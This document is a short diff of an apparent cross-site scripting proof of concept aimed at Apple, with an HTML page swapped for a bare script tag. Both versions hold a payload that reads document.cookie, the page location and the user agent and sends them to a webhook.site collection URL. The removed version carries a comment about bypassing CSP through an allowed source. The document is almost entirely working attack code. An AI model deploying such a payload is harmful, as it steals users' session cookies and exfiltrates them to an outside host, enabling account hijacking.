@@ -1,19 +1,12 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <meta charset="utf-8">
-  <title>Apple XSS PoC</title>
-</head>
-<body>
-  <h2>Testing Apple XSS</h2>
-  <script>
-    // تجاوز CSP: استخدام مصدر مسموح به
-    fetch("https://webhook.site/bed70d88-4b8b-425d-85f8-7393fca9412b", {
-      method: "POST",
-      mode: "no-cors",
-      body: document.cookie + "\n" + document.location + "\n" + navigator.userAgent
-    });
-    alert("XSS ✅ on Apple");
-  </script>
-</body>
-</html>
+<script>
+fetch("https://webhook.site/bed70d88-4b8b-425d-85f8-7393fca9412b", {
+  method: "POST",
+  body: [
+    "XSS ✅ via Apple CSD",
+    "Cookie: " + document.cookie,
+    "Location: " + document.location,
+    "UserAgent: " + navigator.userAgent
+  ].join("\n")
+});
+alert("XSS ✅ on Apple");
+</script>
